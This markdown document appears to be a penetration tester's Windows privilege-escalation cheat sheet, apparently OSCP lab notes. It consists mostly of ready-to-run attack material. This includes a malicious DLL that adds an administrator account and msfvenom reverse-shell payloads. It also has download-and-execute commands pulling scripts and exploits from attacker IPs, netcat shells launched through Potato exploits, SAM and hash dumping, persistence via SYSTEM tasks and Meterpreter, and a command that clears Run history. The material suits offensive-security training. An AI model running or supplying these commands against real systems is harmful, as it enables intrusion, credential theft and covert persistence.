# Privilege Escalation

Local Windows privilege-escalation pathways, service abuse, token/privilege abuse, installer misuse, and shell-to-admin escalation patterns.
AD-only privilege escalation was stripped out and left in the AD folder.

## Privilege Escalation Windows Checklist

1. Run Seatbelt or WinPEAS for initial enumeration.
2. Use `dsregcmd` to check domain registration.
3. Open PowerShell as admin.
4. Import PowerView:

```powershell
Set-ExecutionPolicy Bypass -Scope Process
Import-Module C:\Tools\PowerView.ps1
Get-NetDomain
```

5. Rerun these steps with different users or attempt `RunAs` with different users or admin PowerShell.
6. Run Seatbelt with system checks:

```powershell
Seatbelt.exe -group=system
```

7. Show hidden files and file extensions.
8. Gather system information:

```powershell
systeminfo
whoami /groups
whoami /all
```

9. Check command history.
10. Examine environment variables:

```powershell
Get-ChildItem Env:
```

11. Run WinPEAS for privilege escalation paths.
12. Enumerate existing users and groups.
13. List group memberships:

```powershell
net user
quser
net localgroup
net localgroup administrators
```

14. Get operating system details:

```powershell
systeminfo
Get-AppLockerPolicy
```

15. Examine AppLocker policies.
16. Check antivirus status:

```powershell
Get-MpPreference
Get-MpComputerStatus
```

17. Inspect the system path:

```powershell
$env:PATH
```

18. List installed applications.
19. Check for KeePass installations.
20. Examine services—start disabled services if possible (e.g., SSH).
21. List running processes:

```powershell
Get-Process | Sort-Object CPU -Descending
```

22. Check for service binary hijacking.
23. Inspect scheduled tasks.
24. Filter non-Microsoft tasks.
25. Use `Invoke-AllChecks` from PowerUp.
26. Check startup directories and autostart entries.
27. Attempt to `RunAs` different users.
28. Inspect the root of `C:\` drive.
29. Check for `Windows.old`.
30. Search for sensitive files:

```powershell
Get-ChildItem -Path C:\Users\ -Include * -File -Recurse -ErrorAction SilentlyContinue
```

31. Attempt to dump SAM database information.
32. Run Live Forensicator scripts.
33. Search for flags using PowerShell one-liners.
34. Check `C:\Windows\System32\Drivers\etc\hosts`.
35. Repeat enumeration steps—**Enumeration is key; try harder.**
36. Verify all findings and ensure no steps were missed.

## Check Permissions!

Check permissions for folders, files, processes, programs, connections, etc.

## DLL Hijacking

https://hijacklibs.net/

- **Find Installed Applications:**

```PowerShell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall*" | select displayname
```

- **Identify Vulnerable DLLs:** _(Requires tools like Process Monitor or manual analysis)
- **Check Service Permissions:**

```PowerShell
icacls "<path_to_service_binary>"
```
    - _Look for "F" (Full Access) for users/groups._
    - Use `runas /user:relia\jim cmd` for elevated shell if permissions are bad - Doesn't need to be user on machine, just needs to be domain user!_
- Can use sysinternals to find dll
	- Start .exe by clicking it
	- Filter for
		- Process Name = scheduler.exe
		- Result != SUCCESS
		- Operation = Create File
- **Malicious DLL (example - adds user 'gigs'):**

```C++
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) {
    switch ( ul_reason_for_call ) {
        case DLL_PROCESS_ATTACH:
            int i;
            i = system ("net user gigs password123! /add");
            i = system ("net localgroup administrators gigs /add");
            break;
        case DLL_THREAD_ATTACH: break;
        case DLL_THREAD_DETACH: break;
        case DLL_PROCESS_DETACH: break;
    }
	return TRUE;
}
```

- **Cross-compile (Kali):**

```bash
x86_64-w64-mingw32-gcc <dll_name>.cpp --shared -o <vulnerable_dll_name>.dll -lws2_32
```

- **Transfer to Target:**

```PowerShell
iwr -uri http://<kali_ip>/<vulnerable_dll_name>.dll -OutFile '<path_to_application>/<vulnerable_dll_name>.dll'
```

- **Start Application:** _(DLL runs with application's privileges)_
- **Verify:**

```PowerShell
net user
net localgroup administrators
```

## Unquoted Service Path

- **Enumerate Services with Unquoted Paths:**

```PowerShell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
wmic service get name,pathname | findstr /i /v "C:\Windows\" | findstr /i /v """
```

- **Check Path Permissions:**

```PowerShell
icacls "<vulnerable_path>"
```
    - _Look for "W" (Write) for BUILTIN\Users._
- **Create Malicious Executable (example - adds user 'gigs'):**

```bash
# Using msfvenom (Kali)
msfvenom -p windows/exec CMD='net user gigs password123! /add' -f exe -o "C:\Program Files\Unquoted Path Service\common.exe"
```

- **Start Service:**

```PowerShell
Start-Service <vulnerable_service_name>
```

- **Verify:**

```PowerShell
net user
net localgroup administrators
```

- **Alternative using PowerUp:**

```PowerShell
powershell -ep bypass
. .\PowerUp.ps1
Get-UnquotedService
Write-ServiceBinary -Name '<vulnerable_service_name>' -Path "C:\Program Files\Unquoted Path Service\common.exe"
Restart-Service <vulnerable_service_name>
```

## Scheduled Tasks

- **View Scheduled Tasks:**

```PowerShell
Task Scheduler #windows + r taskschd.msc
Get-ScheduledTask
schtasks /query /fo LIST /v
```

- **Check Task File Permissions:**

```PowerShell
icacls "<path_to_task_executable>"
```

- **Replace Executable (example using `adduser.exe`):**

```PowerShell
iwr -Uri http://<kali_ip>/adduser.exe -Outfile "<path_to_task_executable>"
# Might need to backup original
move "<original_path>" "<backup_name>"
move .\BackendCacheCleanup.exe .\Pictures\
```

- **Wait for Task to Run:**
- **Verify:**

```PowerShell
net user
net localgroup administrators
```

## add user to RDP

```
net localgroup "Remote Desktop Users" <username> /add
```

## add user to local administrator

```
net localgroup administrators <username> /add
```

## add user to domain group

```
net group "<group_name>" <username> /ADD /DOMAIN
```

## add usdf - Modify service binary path

```
sc config <Service_Name> binpath= "net user rilak 'P@ssw0rd' /add"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
```

## Mimikatz.ps1 Dump passwords of scheduled tasks

```
Invoke-Mimikatz -Command '"vault::cred /patch"'
```

## PrivEsc Add user to local administrators group

```
Invoke-ServiceAbuse -Name '<VulnerableSvc>' -UserName '<doamin>\<username>'
```

## PrivEsc Exploit vulnerable service permissions

```
Invoke-ServiceAbuse -Name "<VulnerableSvc>" -Command "net localgroup Administrators <domain>\<username> /add"
```

## PrivEsc Exploit an unquoted service path

```
Write-ServiceBinary -Name '<VulnerableSvc>' -Command 'c:\windows\system32\rundll32 c:\Users\Public\beacon.dll,Update' -Path 'C:\Program Files\<VulnerableSvc>'
```

## DLL Hijacking

https://hijacklibs.net/

```
Write-HijackDll -DllPath 'C:\Users\ted\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll' -UserName '<domain>\username'
```

## ServiceAbuse

```
Invoke-ServiceAbuse -Name 'vds' -UserName '<domain>\username'
```

## GodPotato

```
GodPotato-NET4.exe -cmd "net user rilak 1qaz@WSX /add"
GodPotato-NET4.exe -cmd "net localgroup Administrators rilak /add"
```

---

## SYSTEM SCHEDULED TASK?

```powershell
schtasks /create /ru SYSTEM /sc ONSTART /tn WinUpdate /tr "powershell -ep bypass -c iex((New-Object Net.WebClient).DownloadString('http://<ip>/rev.ps1'))"
```

## WMI EVENT SUB BACKDOOR?

```powershell
powershell -c "Invoke-WmiMethod -Namespace root\subscription ..."
```

############################################

## CLEAR CMD RUNMRU?

```powershell
reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
```
########################################################

---
+-------------------------------+
| INITIAL ENUMERATION |
+-------------------------------+

**DOMAIN ENUM (if joined)**
BloodHound / SharpHound

**WHOAMI?**
```cmd
whoami
echo %username%
```

**PRIVILEGES?**
```cmd
whoami /priv
```

**SYSTEM INFO**
```cmd
systeminfo
wmic os get Caption,CSDVersion,OSArchitecture,Version
```

**SERVICES**
```cmd
wmic service get name,startname
net start
```

**ADMIN CHECK**
```cmd
net localgroup administrators
net user
```

**NETWORK**
```cmd
netstat -anoy
route print
arp -A
ipconfig /all
```

**USERS**
```cmd
net users
net user
net localgroup
```

**FIREWALL**
```cmd
netsh advfirewall firewall show rule name=all
```

**SCHEDULED TASKS**
```cmd
schtasks /query /fo LIST /v > schtasks.txt
```

INSTALLATION RIGHTS
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

+-----------------------------------------------------------------------+
|     WINDOWS PRIV ESC: GITHUB EXPLOITS                                 |
+-----------------------------------------------------------------------+
| Privilege Name              | GitHub PoC                              |
|---------------------------- |-----------------------------------------|
| SeDebugPrivilege            | github.com/bruno-1337/SeDebugPrivilege- |
| SeImpersonatePrivilege      | github.com/itm4n/PrintSpoofer           |
| SeAssignPrimaryToken        | github.com/b4rdia/HackTricks            |
| SeTcbPrivilege              | github.com/hatRiot/token-priv           |
| SeCreateTokenPrivilege      | github.com/hatRiot/token-priv           |
| SeLoadDriverPrivilege       | github.com/k4sth4/SeLoadDriverPrivilege |
| SeTakeOwnershipPrivilege    | github.com/hatRiot/token-priv           |
| SeRestorePrivilege          | github.com/xct/SeRestoreAbuse           |
| SeBackupPrivilege           | github.com/k4sth4/SeBackupPrivilege     |
| SeIncreaseQuotaPrivilege    | github.com/b4rdia/HackTricks            |
| SeSystemEnvironment         | github.com/b4rdia/HackTricks            |
| SeMachineAccount            | github.com/b4rdia/HackTricks            |
| SeTrustedCredManAccess      | learn.microsoft.com/...trusted-caller   |
| SeRelabelPrivilege          | github.com/decoder-it/RelabelAbuse      |
| SeManageVolumePrivilege     | github.com/CsEnox/SeManageVolumeExploit |
| SeCreateGlobalPrivilege     | github.com/b4rdia/HackTricks            |
+-----------------------------------------------------------------------+
```
Notes:
- PrintSpoofer is gold for `SeImpersonatePrivilege`.
- `SeManageVolume` has practical field PoCs.
+----------------------------+
|     MAINTAINING ACCESS     |
+----------------------------+
> METERPRETER REVERSE SHELL SETUP
```bash
  msfconsole
  use exploit/multi/handler
  set PAYLOAD windows/meterpreter/reverse_tcp
  set LHOST <attacker_ip>
  set LPORT <port>
  exploit
```

> PERSISTENCE
```bash
  meterpreter > run persistence -U -i 5 -p 443 -r <LHOST>
```

> PORT FORWARDING
```bash
  meterpreter > portfwd add -l 3306 -p 3306 -r <target_ip>
```

> SYSTEM MIGRATION
```bash
  meterpreter > run post/windows/manage/migrate
  meterpreter > migrate <PID>
```

> EXECUTE PAYLOADS
```powershell
  powershell.exe "C:\Tools\privesc.ps1"
```

+-------------------------------+
|        PRIVES EC CHECKLIST    |
+-------------------------------+
> UNQUOTED SERVICE PATHS
```cmd
  wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /v "C:\Windows" | findstr /v '"'
```

> WEAK SERVICE PERMISSIONS
```cmd
  accesschk.exe -uwcqv <service>
  sc qc <service>
  icacls "C:\Path\To\Service.exe"
```

> FILE TRANSFER OPTIONS
```cmd
  certutil.exe
  powershell (IEX)
  SMB / FTP / TFTP / VBScript
```

> CLEAR TEXT CREDENTIALS
```cmd
  findstr /si password *.txt *.xml *.ini
  dir /s *pass* == *cred* == *.config*
```

> WEAK FILE PERMISSIONS
```cmd
  accesschk.exe -uwqs Users c:\*.*
  accesschk.exe -uwqs "Authenticated Users" c:\*.*
```

> NEW ADMIN USER (Local/Domain)
```cmd
  net user siren P@ssw0rd! /add
  net localgroup administrators siren /add
  net group "Domain Admins" siren /add /domain
```

+--------------------------------+
|     SCHEDULED TASK ABUSE       |
+--------------------------------+
> ENUM
```cmd
  schtasks /query /fo LIST /v > tasks.txt
```

> CREATE SYSTEM TASK
```cmd
  schtasks /create /ru SYSTEM /sc MINUTE /mo 5 /tn RUNME /tr "C:\Tools\sirenMaint.exe"
```

> RUN TASK
```cmd
  schtasks /run /tn "RUNME"
```

+-------------------------------+
|    POST EXPLOIT ENUMERATION   |
+-------------------------------+
> NETWORK USERS
```cmd
  net user
  net user <target>
  net localgroup administrators
```

> NT AUTHORITY CHECKS
```cmd
  whoami
  accesschk.exe /accepteula
  MS09-012.exe "whoami"
```

> HASH DUMP
`  meterpreter > hashdump`

> EXFILTRATE ntds.dit
`  Use secretsdump.py or disk capture tools`

> INSTALLER ABUSE
```cmd
  AlwaysInstallElevated = 1
  msiexec /i evil.msi
```

> SHARE ENUMERATION
```cmd
  net share
  net use
  net use Z: \\TARGET\SHARE /persistent:yes
```

+----------------------------+
|   TOOLKIT / RESOURCES      |
+----------------------------+
> Windows Exploit Suggester
  https://github.com/AonCyberLabs/Windows-Exploit-Suggester

> Cross Compile Payloads (Linux > Windows)
```bash
  apt-get install mingw-w64
  x86: i686-w64-mingw32-gcc hello.c -o hello.exe
  x64: x86_64-w64-mingw32-gcc hello.c -o hello64.exe
```

> Additional Reading
  https://www.fuzzysecurity.com/tutorials/16.html
  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation

---

[Windows Local Privilege Escalation | HackTricks | HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)

```
whoami
whoami /priv
whoami /groups
net user
Get-LocalUser
net user steve
Get-LocalUser steve
net group
Get-LocalGroup
Get-LocalGroupMember Administrators
net localgroup administrators
```

## System

```
systeminfo
hostname
ipconfig
Get-ADdomain
netstat -a
tree \users\ /f /a
```

## PowerShell history

```
Get-History
(Get-PSReadlineOption).HistorySavePath
type C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
type C:\Users\Lance.Rubens\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

Get-ChildItem Env: | ft Key,Value

Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini,*.kdbx,*.log -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

icacls "C:\Program Files\MilleGPG5\GPGService.exe"
stop-service GPGOrchestrator
copy shell.exe "C:\Program Files\MilleGPG5\GPGService.exe"
start-service GPGOrchestrator

sc.exe qc VeyonService
move veyon-service.exe veyon-service.bak
move shell64.exe veyon-service.exe
shutdown /r /t 0

schtasks /query /fo LIST /v | Select-String -Pattern "TaskName:"
schtasks /query /fo LIST /v | Select-String -Pattern "Task To Run:"

schtasks /query /fo LIST /v /tn \Microsoft\CacheCleanup
icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
```

## Git

```
gci -Recurse -Filter ".git" -Directory -ErrorAction SilentlyContinue -Path "C:\Users\"
```
```
git clone https://github.com/arthaud/git-dumper.git
python -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
python git_dumper.py http://192.168.217.144/.git ~/Documents/oscpA/git144
```
```
takeown /F <dir> /R
git log
git diff <commit hash>
```

## Service Hijacking

```
Restart-Service -Name 'mysql'
shutdown /r /t 0
```
```
get-childitem env:
```
```
echo %PATH%
get-childitem env:path | Format-List *
certutil -urlcache -split -f http://192.168.45.214/shell.dll C:\Users\emma\AppData\Local\Microsoft\WindowsApps\BetaLibrary.Dll
```

## AlwaysInstallElevated

```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.154 LPORT=445 -f msi > notavirus.msi
msiexec /i notavirus.msi
```

## WinPEASx64.exe

```
certutil -split -urlcache -f http://192.168.45.218/winPEASx64.exe \windows\temp\winpeas.exe
\windows\temp\winpeas.exe
```

## SeRestorePrivilege

```
# Enable the privilege (Can skip if Enabled already)
wget https://raw.githubusercontent.com/gtworek/PSBits/master/Misc/EnableSeRestorePrivilege.ps1
certutil -urlcache -split -f http://192.168.45.211/EnableSeRestorePrivilege.ps1
./EnableSeRestorePrivilege.ps1

# Abuse with RDP - Change binary in system32
move C:\Windows\System32\utilman.exe C:\Windows\System32\utilman.old
move C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
rdesktop 192.168.224.165
# press Win+U

# If shell drops we can add user to admin group with fast typing
net localgroup administrators enox /add
```

[Abusing Tokens | HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens#table)

## SeBackupPrivilege

```
mkdir C:\temp
reg save hklm\sam C:\temp\sam.hive
reg save hklm\system C:\temp\system.hive
# download the files to Kali
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

## SeManageVolumePrivilege

https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public?source=post_page-----b95d3146cfe9---------------------------------------
```cmd
certutil -urlcache -split -f http://192.168.45.214/SeManageVolumeExploit.exe
\SeManageVolumeExploit.exe

msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.45.214 LPORT=443 -f dll -o Printconfig.dll

certutil -split -urlcache -split -f http://192.168.45.214/payload/Printconfig.dll

copy Printconfig.dll C:\Windows\System32\spool\drivers\x64\3\
# press Yes

nc -lvnp 443 # setup listener on KALI

# on target - run trigger
powershell
$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")
$object = [Activator]::CreateInstance($type)
# should get nt authority\system shell

--- another dll to try

Systeminfo’s tzres.dll

Create another reverse shell outputting the file as tzres.dll and transfer it to the victim; placing it in the c:\windows\system32\wbem directory

Start listener

Run systeminfo
```

There is another trigger we can use (Report.wer and WerTrigger.exe in /bin in repo):

[GitHub - sailay1996/WerTrigger: Weaponizing for privileged file writes bugs with windows problem reporting](https://github.com/sailay1996/WerTrigger/tree/master)

## Invoke-RunasCs.ps1 Or RunasCs.exe

Allows to run commands as another user locally

```
certutil -split -urlcache -f http://192.168.45.197/Invoke-RunasCs.ps1
Import-Module .\Invoke-RunasCs.ps1
Invoke-RunasCs svc_mssql trustno1 "C:\xampp\htdocs\uploads\shell64.exe"
```
```
runas /env /profile /user:DVR4\Administrator "C:\temp\nc.exe -e cmd.exe 192.168.118.14 443"
runas /user:oscp\bernie cmd.exe
# With RDP we can run as administrator (cmd) and type cleartext creds of other admin user
```

It is important so the payload will be correct arch. Use this powershell script:

```
Add-Type -MemberDefinition @'
[DllImport("kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.Winapi)]
[return: MarshalAs(UnmanagedType.Bool)]
public static extern bool IsWow64Process(
    [In] System.IntPtr hProcess,
    [Out, MarshalAs(UnmanagedType.Bool)] out bool wow64Process);
'@ -Name NativeMethods -Namespace Kernel32

Get-Process "FJTWSVIC" | Foreach {
    $is32Bit=[int]0
    if ([Kernel32.NativeMethods]::IsWow64Process($_.Handle, [ref]$is32Bit)) {
        "$($_.Name) $($_.Id) is $(if ($is32Bit) {'32-bit'} else {'64-bit'})"
    }
    else {"IsWow64Process call failed"}
```

so the payload which we generate will be x86:

```
msfvenom -p windows/shell_reverse_tcp -f dll -o UninOldIS.dll LHOST=192.168.45.213 LPORT=443
```
```
set PATH=%SystemRoot%\system32;%SystemRoot%;
%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe
```
```
%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass .\exploit.ps1
```

## Cross-Compile

```
i686-w64-mingw32-gcc 40564.c -o pwn.exe -lws2_32
```
```
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

## PrintSpoofer

```
iwr -uri http://10.10.137.147:8888/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
.\PrintSpoofer64.exe -i -c powershell.exe
```

if error jumps during download try:

```
$ProgressPreference = "SilentlyContinue"
-UseBasicParsing (required -Outfile)
```

## Potatoes

**JuicyPotatoNG**

```
cd \Windows\Temp
certutil -urlcache -split -f http://192.168.45.234/JuicyPotatoNG.exe
.\JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami > C:\test.txt"
certutil -urlcache -split -f http://192.168.45.234/nc64.exe
.\JuicyPotatoNG.exe -t * -p "C:\Windows\Temp\nc64.exe" -a "192.168.45.234 443 -e cmd.exe"
```

[https://github.com/antonioCoco/JuicyPotatoNG](https://github.com/antonioCoco/JuicyPotatoNG)

**GodPotato**

```
certutil -urlcache -split -f http://192.168.45.247/GodPotato/GodPotato-NET4.exe
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
.\GodPotato-NET4.exe -cmd "cmd /c C:/Windows/Temp/shell.exe"

.\GodPotato-NET4.exe -cmd "nc64.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.247 443"
net user /add [username] [password]
net localgroup administrators [username] /add
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
```
```
net user /add kali SuperPass123!
net localgroup administrators kali /add
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
```

[https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)

**SweetPotato**

Download:

```
.\SweetPotato.exe -e EfsRpc -p c:\Users\Public\nc.exe -a "10.10.10.10 1234 -e cmd"
```

[https://github.com/CCob/SweetPotato](https://github.com/CCob/SweetPotato)

**JuicyPotato (x86)**

Download: [https://github.com/ivanitlearning/Juicy-Potato-x86/releases](https://github.com/ivanitlearning/Juicy-Potato-x86/releases)

Get CLSID: [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

```
Juicy.Potato.x86.exe -c {CLSID} -t * -l 443 -p "C:\Temp\nc.exe" -a "192.168.45.194 443 -e cmd"
```

[juicy-potato/CLSID at master · ohpe/juicy-potato](https://github.com/ohpe/juicy-potato/tree/master/CLSID)

Video: [https://www.youtube.com/watch?v=k9p6wZO7RyY](https://www.youtube.com/watch?v=k9p6wZO7RyY)

## CLEAR CMD RUNMRU? / Active Directory

[Domain Enumeration + Exploitation | burmat / nathan burchfield](https://burmat.gitbook.io/security/hacking/domain-exploitation)

```
net users
net users /domain
net groups /domain
net localgroup administrators
```

## RDP

```
xfreerdp /u:offsec /d:oscp.lab /p:Seawater! +clipboard /cert:ignore
xfreerdp /u:offsec /d:oscp.lab /pth:<hash> +clipboard /cert:ignore
```

## TTY windows

[ConPtyShell/Invoke-ConPtyShell.ps1 at master · antonioCoco/ConPtyShell](https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1)

## Powershell Remoting

```
Invoke-Command -ComputerName DC01 -ScriptBlock {ipconfig}

$DC01Session = New-PSSession -ComputerName 'DC01'
Enter-PSSession -Session $DC01Session
```

## DCOM

```
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))

$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
```

---

## Windows Enumeration Scripts

- **WinPEAS.exe**
- **windows-exploit-suggester.py**
- **PowerUp.ps1:**

```PowerShell
REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
# WinPEAs FIX!
PowerShell
powershell -ep bypass
. .\PowerUp.ps1
Invoke-AllChecks
Get-ModifiableServiceFile # Check for writable service files
# AbuseFunction (less reliable)
```

- **Seatbelt**
- **JAWS**

## LOLBINS (Living Off The Land Binaries)

- _Utilize built-in Windows tools for malicious purposes._

## Token Impersonation

```PowerShell
whoami /priv
.\GodPotato.exe -cmd "cmd.exe /c whoami"
.\god.exe -cmd "nc.exe 192.168.45.165 4444 -e cmd.exe"
```

## Stored Passwords

```PowerShell
findstr /si password *.txt *.ini *.config
netsh wlan show profile
netsh wlan show profile <SSID> key=clear
```

## AV Enumeration

```PowerShell
sc query windefend
sc queryex type= service
netsh advfirewall firewall dump
netsh firewall show state
netsh firewall show config
```

## WSL (Windows Subsystem for Linux)

```PowerShell
where /R c:\windows wsl.exe
where /R c:\windows bash.exe
c:\Windows\Path\To\wsl.exe whoami
c:\Windows\Path\To\bash.exe
```

## RunAs

```PowerShell
cmdkey /list
runas /env /noprofile /savecred /user:<domain>\<administrator_user> "cmd.exe /c whoami > whoami.txt"
runas /env /noprofile /savecred /user:<domain>\<administrator_user> "c:\temp\nc.exe <IP> 443 -e cmd.exe"
```

## Service Permissions (using `sc qc`)

```PowerShell
sc qc <service_name>
```

## Autoruns

```PowerShell
reg query "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"
icacls "<path_to_autorun_program>"
.\accesschk64.exe -wvu "<path_to_autorun_program>" -accepteula
# Create payload with MSFvenom and replace
```

## AlwaysInstallElevated

```PowerShell
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
# Create malicious MSI with MSFvenom
```

## regsvc Permissions

```PowerShell
Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
# If NT AUTHORITY\INTERACTIVE has FullControl, create payload and modify ImagePath
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
```

## Executable Files Permissions

```PowerShell
.\accesschk64.exe -wvu "<path_to_executable_directory>"
# If Everyone has FILE_ALL_ACCESS, create payload and replace
sc start <vulnerable_service>
```

## StartUp Folder Permissions

```PowerShell
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
# If BUILTIN\Users has full access, create payload and place there
```

## Binary Paths Permissions

```PowerShell
.\accesschk64.exe -wuvc Everyone *
.\accesschk64.exe -wuvc <vulnerable_service>
sc qc <vulnerable_service>
# If SERVICE_CHANGE_CONFIG is available, modify binpath
sc config <vulnerable_service> binpath= "net localgroup administrators user /add"
sc start <vulnerable_service>
```

## Config Files

```PowerShell
notepad C:\Windows\Panther\Unattend.xml
# Extract and decode base64 passwords
echo [base64_string] | base64 -d
```

## Memory

- _Create a dump file of a running process and analyze with `strings` for sensitive information._
```bash
strings <dump_file>.DMP | grep "Authorization: Basic"
echo -ne [base64_string] | base64 -d
```
